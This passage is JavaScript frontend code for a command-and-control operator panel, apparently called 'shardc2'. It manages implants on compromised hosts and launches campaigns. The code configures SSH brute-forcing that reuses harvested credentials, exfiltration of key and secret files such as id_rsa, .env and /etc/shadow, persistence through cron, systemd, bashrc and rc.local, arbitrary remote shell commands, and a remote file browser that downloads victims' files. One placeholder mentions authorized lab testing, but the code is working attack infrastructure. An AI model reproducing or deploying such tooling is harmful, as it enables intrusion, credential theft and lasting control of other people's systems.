            <input type="text" id="brute-passes" placeholder="Enter passwords for authorized lab testing">
          </div>
          <div class="form-group">
            <label>Workers (concurrent threads)</label>
            <input type="number" id="brute-workers" placeholder="10" value="10" min="1" max="100">
          </div>
          <div class="form-group config-full">
            <label><input type="checkbox" id="brute-dbcreds" checked> Include harvested credentials from database</label>
          </div>
        </div>`,
      exfil: `
        <div class="config-grid">
          <div class="form-group config-full">
            <label>File Patterns (comma-separated)</label>
            <input type="text" id="exfil-patterns" placeholder="*.pem, *.key, .env, id_rsa" value="id_rsa, id_ed25519, *.pem, *.key, .env, *.env, wp-config.php, credentials, shadow">
          </div>
          <div class="form-group">
            <label>Specific Paths (comma-separated)</label>
            <input type="text" id="exfil-paths" placeholder="/etc/shadow, /root/.ssh/id_rsa">
          </div>
          <div class="form-group">
            <label>Max File Size</label>
            <input type="text" id="exfil-maxsize" placeholder="1M" value="1M">
          </div>
        </div>`,
      persist: `
        <div style="color:var(--text-muted);font-size:0.65rem;letter-spacing:0.1em;margin-bottom:0.5rem">PERSISTENCE METHODS</div>
        <div class="bot-picker">
          ${['cron','systemd','bashrc','rc.local'].map(m =>
            `<div class="bot-chip selected" data-method="${m}" onclick="this.classList.toggle('selected')">${m.toUpperCase()}</div>`
          ).join('')}
        </div>`,
      custom: `
        <div class="config-grid">
          <div class="form-group config-full">
            <label>Command</label>
            <textarea id="custom-cmd" rows="3" placeholder="whoami && id && uname -a" style="min-height:80px"></textarea>
          </div>
          <div class="form-group">
            <label>Command Type</label>
            <select id="custom-type">
              <option value="shell">SHELL</option>
              <option value="download">DOWNLOAD</option>
              <option value="upload">UPLOAD</option>
              <option value="persist">PERSIST</option>
            </select>
          </div>
        </div>`,
    };

    el.innerHTML = configs[type] || '';
  }

  buildCampaignConfig() {
    const type = document.getElementById('camp-type').value;

    switch (type) {
      case 'recon': {
        const modules = [...document.querySelectorAll('#camp-config-form .bot-chip.selected')]
          .map(el => el.dataset.module).filter(Boolean);
        return JSON.stringify({ modules });
      }
      case 'brute': {
        const modeEl = document.querySelector('[data-mode].selected');
        const mode = modeEl ? modeEl.dataset.mode : 'lateral';
        const targets = (document.getElementById('brute-targets')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const ports = (document.getElementById('brute-ports')?.value || '22').split(',').map(s => parseInt(s.trim())).filter(Boolean);
        const usernames = (document.getElementById('brute-users')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const passwords = (document.getElementById('brute-passes')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const use_db_creds = document.getElementById('brute-dbcreds')?.checked || false;
        const workers = parseInt(document.getElementById('brute-workers')?.value) || 10;
        return JSON.stringify({ mode, targets, ports, usernames, passwords, use_db_creds, workers });
      }
      case 'exfil': {
        const patterns = (document.getElementById('exfil-patterns')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const paths = (document.getElementById('exfil-paths')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const max_file_size = document.getElementById('exfil-maxsize')?.value || '1M';
        return JSON.stringify({ patterns, paths, max_file_size });
      }
      case 'persist': {
        const methods = [...document.querySelectorAll('#camp-config-form .bot-chip.selected')]
          .map(el => el.dataset.method).filter(Boolean);
        return JSON.stringify({ methods });
      }
      case 'custom': {
        const command = document.getElementById('custom-cmd')?.value || '';
        const cmdType = document.getElementById('custom-type')?.value || 'shell';
        return JSON.stringify({ command, type: cmdType });
      }
    }
    return '{}';
  }

  getSelectedBotIds() {
    return [...document.querySelectorAll('#camp-bot-picker .bot-chip.selected')]
      .map(el => el.dataset.botid).filter(Boolean);
  }

  async createCampaign(andLaunch = false) {
    const name = document.getElementById('camp-name').value.trim();
    const type = document.getElementById('camp-type').value;
    const desc = document.getElementById('camp-desc').value.trim();
    const config = this.buildCampaignConfig();
    const botIds = this.getSelectedBotIds();

    if (!name) { alert('Operation name required'); return; }
    const isExternalBrute = type === 'brute' && config.includes('"external"');
    if (botIds.length === 0 && !isExternalBrute) { alert('Select at least one implant'); return; }

    const result = await this.api.post('/campaigns/', { name, type, description: desc, config });
    if (!result.id) { alert('Failed to create campaign'); return; }

    await this.api.post(`/campaigns/${result.id}/bots`, { bot_ids: botIds });

    if (andLaunch) {
      await this.api.post(`/campaigns/${result.id}/launch`);
    }

    document.getElementById('camp-name').value = '';
    document.getElementById('camp-desc').value = '';
    this.refreshCampaigns();
  }

  async createAndLaunchCampaign() {
    await this.createCampaign(true);
  }

  async refreshCampaigns() {
    const data = await this.api.get('/campaigns/');
    const camps = data.campaigns || [];
    const el = document.getElementById('camps-table');
    if (!el) return;

    if (camps.length === 0) {
      el.innerHTML = '<div class="empty-state"><div class="icon">&#9733;</div><p>NO OPERATIONS</p></div>';
      return;
    }

    el.innerHTML = `<div class="table-wrap"><table>
      <thead><tr><th>Operation</th><th>Type</th><th>Status</th><th>Bots</th><th>Progress</th><th>Created</th><th>Actions</th></tr></thead>
      <tbody>${camps.map(c => {
        const pct = c.total_tasks > 0 ? Math.round((c.completed_tasks + c.failed_tasks) / c.total_tasks * 100) : 0;
        const progressHtml = c.total_tasks > 0
          ? `<div style="display:flex;align-items:center;gap:0.5rem">
              <div style="flex:1;background:var(--bg-input);height:8px;border:1px solid var(--border);min-width:80px">
                <div style="height:100%;width:${pct}%;background:${c.failed_tasks > c.completed_tasks ? 'var(--red)' : 'var(--green)'};transition:width 0.3s"></div>
              </div>
              <span style="font-size:0.65rem;color:var(--text-secondary)">${c.completed_tasks}/${c.total_tasks}</span>
            </div>`
          : '<span style="color:var(--text-muted);font-size:0.7rem">-</span>';
        return `
        <tr class="clickable" onclick="app.openCampaign('${c.id}')">
          <td style="color:var(--red-bright);font-weight:600">${esc(c.name)}</td>
          <td><span class="os-tag">${esc(c.type).toUpperCase()}</span></td>
          <td>${campStatusBadge(c.status)}</td>
          <td style="text-align:center">${c.bot_count || 0}</td>
          <td>${progressHtml}</td>
          <td>${timeAgo(c.created_at)}</td>
          <td>
            ${app.canEdit() ? `
            ${c.status === 'created' ? `<button class="btn-accent" style="padding:0.25rem 0.6rem;font-size:0.65rem" onclick="event.stopPropagation();app.launchCampaign('${c.id}')">LAUNCH</button>` : ''}
            ${c.status === 'running' ? `<button class="btn-sm" onclick="event.stopPropagation();app.pauseCampaign('${c.id}')">PAUSE</button>` : ''}
            ${c.status === 'paused' ? `<button class="btn-sm" onclick="event.stopPropagation();app.resumeCampaign('${c.id}')">RESUME</button>` : ''}
            ${c.status === 'completed' || c.status === 'failed' || c.status === 'paused' ? `<button class="btn-sm" style="color:var(--cyan)" onclick="event.stopPropagation();app.replayCampaign('${c.id}')">REPLAY</button>` : ''}
            <button class="btn-sm btn-danger" onclick="event.stopPropagation();app.deleteCampaign('${c.id}')">DELETE</button>
            ` : '<span style="color:var(--text-muted)">-</span>'}
          </td>
        </tr>`;
      }).join('')}</tbody></table></div>`;
  }

  async openCampaign(id) {
    this.activeCampaignId = id;
    clearInterval(this.refreshTimer);
    await this.renderCampaignDetail(id);
  }

  async renderCampaignDetail(id) {
    const c = document.getElementById('content');

    try {
      const [camp, botsData, progress, results] = await Promise.all([
        this.api.get(`/campaigns/${id}`),
        this.api.get(`/campaigns/${id}/bots`),
        this.api.get(`/campaigns/${id}/progress`),
        this.api.get(`/campaigns/${id}/results`),
      ]);

      const pct = progress.total > 0 ? Math.round(progress.percent) : 0;
      const isComplete = progress.status === 'completed' || progress.status === 'failed';
      const tasks = results.tasks || [];
      const campBots = botsData.bots || [];

      c.innerHTML = `
        <div class="page-header">
          <h1 class="page-title">${esc(camp.name)}</h1>
          <span class="page-tag">${esc(camp.type).toUpperCase()}</span>
          <div style="margin-left:auto;display:flex;gap:0.5rem">
            ${this.canEdit() ? `
            ${camp.status === 'created' ? `<button class="btn-accent" onclick="app.launchCampaign('${id}')">LAUNCH</button>` : ''}
            ${camp.status === 'running' ? `<button class="btn-sm" onclick="app.pauseCampaign('${id}')">PAUSE</button>` : ''}
            ${camp.status === 'paused' ? `<button class="btn-accent" onclick="app.resumeCampaign('${id}')">RESUME</button>` : ''}
            ${camp.status === 'completed' || camp.status === 'failed' || camp.status === 'paused' ? `<button class="btn-accent" onclick="app.replayCampaign('${id}')">REPLAY</button>` : ''}
            ` : ''}
            <button class="btn-sm" onclick="app.activeCampaignId=null;app.navigate('campaigns')">BACK</button>
          </div>
        </div>

        <div class="camp-detail">
          <div class="camp-meta">
            <div class="camp-meta-item">
              <span class="camp-meta-label">Status</span>
              <span class="camp-meta-value">${campStatusBadge(camp.status)}</span>
            </div>
            <div class="camp-meta-item">
              <span class="camp-meta-label">Type</span>
              <span class="camp-meta-value" style="text-transform:uppercase">${esc(camp.type)}</span>
            </div>
            <div class="camp-meta-item">
              <span class="camp-meta-label">Implants</span>
              <span class="camp-meta-value">${campBots.length}</span>
            </div>
            <div class="camp-meta-item">
              <span class="camp-meta-label">Created</span>
              <span class="camp-meta-value">${new Date(camp.created_at).toLocaleString()}</span>
            </div>
            ${camp.description ? `<div class="camp-meta-item"><span class="camp-meta-label">Brief</span><span class="camp-meta-value">${esc(camp.description)}</span></div>` : ''}
          </div>

          ${progress.total > 0 ? `
            <div class="progress-wrap">
              <div class="progress-bar ${isComplete ? 'complete' : ''}" style="width:${pct}%"></div>
              <div class="progress-text">${pct}% - ${progress.completed + progress.failed}/${progress.total} TASKS</div>
            </div>
            <div class="progress-stats">
              <span><span class="dot-green">&#9632;</span> Completed: ${progress.completed}</span>
              <span><span class="dot-red">&#9632;</span> Failed: ${progress.failed}</span>
              <span><span class="dot-yellow">&#9632;</span> Pending: ${progress.pending}</span>
            </div>
          ` : '<div style="color:var(--text-muted);font-size:0.75rem;margin-top:0.5rem">No tasks generated yet. Launch the campaign to begin.</div>'}
        </div>

        ${camp.status === 'created' ? `
          <div class="camp-detail" style="border-top-color:var(--yellow)">
            <div style="margin-bottom:0.6rem;color:var(--text-muted);font-size:0.65rem;letter-spacing:0.1em">ASSIGN IMPLANTS</div>
            <div class="bot-picker" id="detail-bot-picker">
              ${this.bots.map(b => {
                const assigned = campBots.some(cb => cb.id === b.id);
                return `<div class="bot-chip ${assigned ? 'selected' : ''}" data-botid="${b.id}" onclick="app.toggleCampaignBot('${id}','${b.id}',this)">
                  <span>${esc(b.hostname)} [${b.id.substring(0, 8)}]</span>
                  <span style="color:var(--text-muted);font-size:0.65rem">${esc(b.ip_address)}</span>
                </div>`;
              }).join('')}
            </div>
          </div>
        ` : ''}

        <div class="tab-bar">
          <button class="tab-btn ${this.campaignTab === 'overview' ? 'active' : ''}" onclick="app.campaignTab='overview';app.renderCampaignDetail('${id}')">Results (${tasks.length})</button>
          <button class="tab-btn ${this.campaignTab === 'bots' ? 'active' : ''}" onclick="app.campaignTab='bots';app.renderCampaignDetail('${id}')">Implants (${campBots.length})</button>
          <button class="tab-btn ${this.campaignTab === 'config' ? 'active' : ''}" onclick="app.campaignTab='config';app.renderCampaignDetail('${id}')">Config</button>
        </div>
        <div style="display:flex;gap:0.5rem;margin-top:0.5rem">
          <button class="btn-sm" onclick="app.exportCampaign('${id}','json')">EXPORT JSON</button>
          <button class="btn-sm" onclick="app.exportCampaign('${id}','html')">EXPORT HTML</button>
          <button class="btn-sm" onclick="app.exportCampaign('${id}','md')">EXPORT MD</button>
        </div>
        <div id="camp-tab-content"></div>`;

      const tabEl = document.getElementById('camp-tab-content');

      if (this.campaignTab === 'overview') {
        if (tasks.length === 0) {
          tabEl.innerHTML = '<div class="empty-state"><p>NO RESULTS YET</p></div>';
        } else {
          tabEl.innerHTML = tasks.map(t => `
            <div class="task-result" id="task-${t.id}">
              <div class="task-result-header" onclick="document.getElementById('task-${t.id}').classList.toggle('expanded')">
                ${campStatusBadge(t.status)}
                <span class="task-name">${esc(t.task_name)}</span>
                <span class="task-bot" style="color:var(--text-muted)">${esc(t.hostname)} [${t.bot_id.substring(0, 8)}]</span>
                ${t.completed_at ? `<span style="font-size:0.65rem;color:var(--text-muted)">${timeAgo(t.completed_at)}</span>` : ''}
                <span class="expand-icon">&#9654;</span>
              </div>
              <div class="task-result-body">${t.output ? esc(t.output) : '(no output)'}</div>
            </div>`).join('');
        }
      } else if (this.campaignTab === 'bots') {
        if (campBots.length === 0) {
          tabEl.innerHTML = '<div class="empty-state"><p>NO IMPLANTS ASSIGNED</p></div>';
        } else {
          tabEl.innerHTML = `<div class="table-wrap"><table>
            <thead><tr><th>ID</th><th>Hostname</th><th>IP</th><th>Platform</th><th>User</th><th>Status</th></tr></thead>
            <tbody>${campBots.map(b => `
              <tr>
                <td style="color:var(--red)">${b.id.substring(0, 8)}</td>
                <td style="color:var(--text-bright)">${esc(b.hostname)}</td>
                <td>${esc(b.ip_address)}</td>
                <td>${esc(b.os)}/${esc(b.architecture)}</td>
                <td>${esc(b.username)}</td>
                <td>${statusBadge(b)}</td>
              </tr>`).join('')}</tbody></table></div>`;
        }
      } else if (this.campaignTab === 'config') {
        let configStr = camp.config || '{}';
        try { configStr = JSON.stringify(JSON.parse(configStr), null, 2); } catch(e) {}
        tabEl.innerHTML = `
          <div class="task-result expanded">
            <div class="task-result-body" style="display:block;color:var(--text-primary)">${esc(configStr)}</div>
          </div>`;
      }

      if (camp.status === 'running') {
        this.refreshTimer = setInterval(() => this.renderCampaignDetail(id), 5000);
      }
    } catch (e) {
      c.innerHTML = `<div class="empty-state"><p>Failed to load campaign: ${esc(e.message)}</p><button class="btn-sm" onclick="app.activeCampaignId=null;app.navigate('campaigns')">BACK</button></div>`;
    }
  }

  async toggleCampaignBot(campId, botId, el) {
    if (el.classList.contains('selected')) {
      await this.api.del(`/campaigns/${campId}/bots/${botId}`);
      el.classList.remove('selected');
    } else {
      await this.api.post(`/campaigns/${campId}/bots`, { bot_ids: [botId] });
      el.classList.add('selected');
    }
  }

  async launchCampaign(id) {
    const result = await this.api.post(`/campaigns/${id}/launch`);
    if (result.error) {
      alert(result.error);
      return;
    }
    if (this.activeCampaignId === id) {
      this.renderCampaignDetail(id);
    } else {
      this.refreshCampaigns();
    }
  }

  async pauseCampaign(id) {
    await this.api.put(`/campaigns/${id}`, { status: 'paused' });
    if (this.activeCampaignId === id) {
      this.renderCampaignDetail(id);
    } else {
      this.refreshCampaigns();
    }
  }

  async resumeCampaign(id) {
    await this.api.put(`/campaigns/${id}`, { status: 'running' });
    if (this.activeCampaignId === id) {
      this.renderCampaignDetail(id);
    } else {
      this.refreshCampaigns();
    }
  }

  async deleteCampaign(id) {
    if (!confirm('Terminate this operation?')) return;
    await this.api.del(`/campaigns/${id}`);
    if (this.activeCampaignId === id) {
      this.activeCampaignId = null;
      this.navigate('campaigns');
    } else {
      this.refreshCampaigns();
    }
  }
  async replayCampaign(id) {
    const autoStart = confirm('Replay this campaign?\n\nOK = Create & Launch immediately\nCancel = Just create (edit before launching)');
    const result = await this.api.post(`/campaigns/${id}/replay`, { auto_start: autoStart });
    if (result.error) {
      alert(result.error);
      return;
    }
    this.activeCampaignId = result.id;
    clearInterval(this.refreshTimer);
    await this.renderCampaignDetail(result.id);
  }

  async exportCampaign(id, format) {
    try {
      const response = await fetch(`/api/v1/campaigns/${id}/report.${format}`, {
        headers: { 'Authorization': `Bearer ${sessionStorage.getItem('shardc2_token')}` }
      });
      if (!response.ok) throw new Error(`Export failed: ${response.statusText}`);
      const blob = await response.blob();
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = `campaign-${id.substring(0, 8)}-report.${format}`;
      a.click();
      URL.revokeObjectURL(a.href);
    } catch (e) {
      alert('Export failed: ' + e.message);
    }
  }

  // ===== SETTINGS / OPERATORS =====
  async renderSettings() {
    if (!this.isAdmin()) {
      this.navigate('dashboard');
      return;
    }
    const c = document.getElementById('content');
    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">SETTINGS</h1>
        <span class="page-tag">USER MANAGEMENT</span>
      </div>
      <div class="camp-detail" id="operator-create-panel">
        <div style="margin-bottom:1rem;color:var(--text-muted);font-size:0.7rem;letter-spacing:0.1em">CREATE OPERATOR</div>
        <div class="config-grid">
          <div class="form-group">
            <label>Username</label>
            <input type="text" id="op-username" placeholder="username">
          </div>
          <div class="form-group">
            <label>Password</label>
            <input type="password" id="op-password" placeholder="password">
          </div>
          <div class="form-group">
            <label>Role</label>
            <select id="op-role">
              <option value="admin">ADMIN</option>
              <option value="operator" selected>OPERATOR</option>
              <option value="viewer">VIEWER</option>
            </select>
          </div>
        </div>
        <div style="margin-top:0.8rem">
          <button class="btn-accent" onclick="app.createOperator()">CREATE OPERATOR</button>
        </div>
      </div>
      <div class="section-header">
        <span class="section-title">OPERATORS</span>
      </div>
      <div id="operators-table"></div>`;
    await this.refreshOperators();
  }

  async refreshOperators() {
    try {
      const data = await this.api.get('/operators');
      const ops = data.operators || data || [];
      const el = document.getElementById('operators-table');
      if (!el) return;

      if (ops.length === 0) {
        el.innerHTML = '<div class="empty-state"><div class="icon">&#9881;</div><p>NO OPERATORS</p></div>';
        return;
      }

      el.innerHTML = `<div class="table-wrap"><table>
        <thead><tr><th>Username</th><th>Role</th><th>Active</th><th>Last Login</th><th>Created</th><th>Actions</th></tr></thead>
        <tbody>${(Array.isArray(ops) ? ops : []).map(o => `
          <tr>
            <td style="color:var(--text-bright)">${esc(o.username)}</td>
            <td><span class="os-tag">${esc(o.role || '').toUpperCase()}</span></td>
            <td>${o.active !== false ? '<span class="badge badge-active">YES</span>' : '<span class="badge badge-dead">NO</span>'}</td>
            <td>${o.last_login ? timeAgo(o.last_login) : '-'}</td>
            <td>${o.created_at ? timeAgo(o.created_at) : '-'}</td>
            <td><button class="btn-sm btn-danger" onclick="app.deleteOperator('${o.id}')">DELETE</button></td>
          </tr>`).join('')}</tbody></table></div>`;
    } catch (e) {
      const el = document.getElementById('operators-table');
      if (el) el.innerHTML = `<div class="empty-state"><p>Failed to load operators: ${esc(e.message)}</p></div>`;
    }
  }

  async createOperator() {
    const username = document.getElementById('op-username').value.trim();
    const password = document.getElementById('op-password').value.trim();
    const role = document.getElementById('op-role').value;
    if (!username || !password) { alert('Username and password required'); return; }
    try {
      await this.api.post('/operators', { username, password, role });
      document.getElementById('op-username').value = '';
      document.getElementById('op-password').value = '';
      await this.refreshOperators();
    } catch (e) {
      alert('Failed to create operator: ' + e.message);
    }
  }

  async deleteOperator(id) {
    if (!confirm('Delete this operator?')) return;
    try {
      await this.api.del(`/operators/${id}`);
      await this.refreshOperators();
    } catch (e) {
      alert('Failed to delete operator: ' + e.message);
    }
  }

  // ===== FILE BROWSER =====
  async renderFileBrowser() {
    const c = document.getElementById('content');

    if (this.bots.length === 0) {
      const data = await this.api.get('/bots/');
      this.bots = data.bots || [];
    }

    const opts = this.bots.map(b =>
      `<option value="${b.id}" ${b.id === this.fileBrowserBotId ? 'selected' : ''}>${esc(b.hostname)} [${b.id.substring(0, 8)}]</option>`
    ).join('');

    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">FILE BROWSER</h1>
        <span class="page-tag">REMOTE FS</span>
      </div>
      <div class="terminal-header" style="margin-bottom:1rem">
        <select id="fb-bot-select" onchange="app.fileBrowserBotId=this.value;app.fileBrowserPath='/';app.browseDir('/')">
          <option value="">-- SELECT TARGET --</option>
          ${opts}
        </select>
        <div class="fb-breadcrumbs" id="fb-breadcrumbs"></div>
      </div>
      <div id="fb-content">
        <div class="empty-state"><p>SELECT A TARGET TO BROWSE FILES</p></div>
      </div>`;

    if (this.fileBrowserBotId) this.browseDir(this.fileBrowserPath);
  }

  async browseDir(path) {
    if (!this.fileBrowserBotId) return;
    this.fileBrowserPath = path;

    this.updateBreadcrumbs(path);
    const el = document.getElementById('fb-content');
    el.innerHTML = '<div class="empty-state"><p>LOADING...</p></div>';

    try {
      const result = await this.api.post('/commands/', {
        bot_id: this.fileBrowserBotId,
        type: 'shell',
        payload: `ls -la --time-style=long-iso ${path.replace(/'/g, "\\'")} 2>&1`,
      });

      const cmdId = result.id;
      let attempts = 0;
      const poll = async () => {
        attempts++;
        const data = await this.api.get(`/commands/history/${this.fileBrowserBotId}`);
        const cmds = data.commands || [];
        const cmd = cmds.find(c => c.id === cmdId);
        if (!cmd || cmd.status === 'pending' || cmd.status === 'executing') {
          if (attempts < 20) setTimeout(poll, 1000);
          else el.innerHTML = '<div class="empty-state"><p>COMMAND TIMED OUT</p></div>';
          return;
        }
        if (cmd.status === 'failed') {
          el.innerHTML = `<div class="empty-state"><p>ERROR: ${esc(cmd.output)}</p></div>`;
          return;
        }
        this.renderFileList(cmd.output, path);
      };
      setTimeout(poll, 1500);
    } catch (e) {
      el.innerHTML = `<div class="empty-state"><p>FAILED: ${esc(e.message)}</p></div>`;
    }
  }

  updateBreadcrumbs(path) {
    const el = document.getElementById('fb-breadcrumbs');
    if (!el) return;
    const parts = path.split('/').filter(Boolean);
    let crumbs = `<span class="fb-crumb" onclick="app.browseDir('/')">/</span>`;
    let acc = '/';
    for (const part of parts) {
      acc += part + '/';
      const p = acc;
      crumbs += `<span class="fb-sep">/</span><span class="fb-crumb" onclick="app.browseDir('${esc(p)}')">${esc(part)}</span>`;
    }
    el.innerHTML = crumbs;
  }

  renderFileList(output, currentPath) {
    const el = document.getElementById('fb-content');
    const lines = output.split('\n').filter(l => l.trim() && !l.startsWith('total '));
    const files = [];

    for (const line of lines) {
      const match = line.match(/^([drwxlsStT\-]{10})\s+(\d+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(\d{4}-\d{2}-\d{2})\s+(\d{2}:\d{2})\s+(.+)$/);
      if (!match) continue;
      const [, perms, , owner, group, size, date, time_, name] = match;
      if (name === '.' || name === '..') continue;
      const isDir = perms.startsWith('d');
      const isLink = perms.startsWith('l');
      const displayName = isLink ? name.split(' -> ')[0] : name;
      files.push({ perms, owner, group, size: parseInt(size), date, time: time_, name: displayName, isDir, isLink, raw: name });
    }

    if (files.length === 0) {
      el.innerHTML = '<div class="empty-state"><p>EMPTY DIRECTORY</p></div>';
      return;
    }

    files.sort((a, b) => {
      if (a.isDir && !b.isDir) return -1;
      if (!a.isDir && b.isDir) return 1;
      return a.name.localeCompare(b.name);
    });

    const parentPath = currentPath === '/' ? null : currentPath.replace(/\/[^\/]+\/?$/, '/') || '/';

    el.innerHTML = `<div class="table-wrap"><table>
      <thead><tr><th>Name</th><th>Permissions</th><th>Owner</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
      <tbody>
        ${parentPath !== null ? `<tr class="clickable" onclick="app.browseDir('${esc(parentPath)}')"><td colspan="6" style="color:var(--yellow)">..</td></tr>` : ''}
        ${files.map(f => {
          const fullPath = currentPath.replace(/\/$/, '') + '/' + f.name;
          const nameStyle = f.isDir ? 'color:var(--yellow);font-weight:600' : f.isLink ? 'color:var(--green)' : 'color:var(--text-bright)';
          const icon = f.isDir ? '&#128193; ' : f.isLink ? '&#128279; ' : '';
          const clickAction = f.isDir ? `onclick="app.browseDir('${esc(fullPath)}/')"` : '';
          return `<tr class="${f.isDir ? 'clickable' : ''}" ${clickAction}>
            <td style="${nameStyle}">${icon}${esc(f.name)}${f.isLink ? ` <span style="color:var(--text-muted)">&rarr; ${esc(f.raw.split(' -> ')[1] || '')}</span>` : ''}</td>
            <td style="color:var(--text-muted);font-size:0.72rem">${esc(f.perms)}</td>
            <td style="font-size:0.72rem">${esc(f.owner)}</td>
            <td style="font-size:0.72rem">${formatSize(f.size)}</td>
            <td style="font-size:0.72rem;color:var(--text-muted)">${f.date} ${f.time}</td>
            <td>${!f.isDir && app.canEdit() ? `<button class="btn-sm" onclick="event.stopPropagation();app.downloadFile('${esc(fullPath)}')">GET</button>` : ''}</td>
          </tr>`;
        }).join('')}
      </tbody></table></div>`;
  }

  async downloadFile(path) {
    if (!this.fileBrowserBotId) return;
    try {
      await this.api.post('/commands/', {
        bot_id: this.fileBrowserBotId,
        type: 'download',
        payload: path,
      });
      alert(`Download command queued for: ${path}\nCheck terminal for base64 output.`);
    } catch (e) {
      alert(`Failed: ${e.message}`);
    }
  }
}

// ===== HELPERS =====
function esc(str) {
  if (!str) return '';
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}

function timeAgo(dateStr) {
  if (!dateStr) return '-';
  const secs = Math.floor((new Date() - new Date(dateStr)) / 1000);
  if (secs < 10) return 'just now';
  if (secs < 60) return `${secs}s ago`;
  if (secs < 3600) return `${Math.floor(secs / 60)}m ago`;
  if (secs < 86400) return `${Math.floor(secs / 3600)}h ago`;
  return `${Math.floor(secs / 86400)}d ago`;
}

function statusBadge(bot) {
  const diffMin = (new Date() - new Date(bot.last_seen)) / 60000;
  if (diffMin < 5) return '<span class="badge badge-active">ACTIVE</span>';
  if (diffMin < 30) return '<span class="badge badge-inactive">IDLE</span>';
  return '<span class="badge badge-dead">DEAD</span>';
}

function campStatusBadge(status) {
  const map = {
    'created': 'badge-inactive',
    'running': 'badge-executing',
    'paused': 'badge-inactive',
    'completed': 'badge-completed',
    'failed': 'badge-failed',
    'pending': 'badge-pending',
  };
  return `<span class="badge ${map[status] || 'badge-dead'}">${esc(status).toUpperCase()}</span>`;
}

function formatSize(bytes) {
  if (bytes === 0) return '0';
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' K';
  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' M';
  return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' G';
}

function osTag(os) {
  if (!os) return '???';
  const o = os.toLowerCase();
  if (o.includes('linux')) return 'LNX';
  if (o.includes('windows')) return 'WIN';
  if (o.includes('darwin') || o.includes('mac')) return 'MAC';
  return '???';
}

const app = new App();
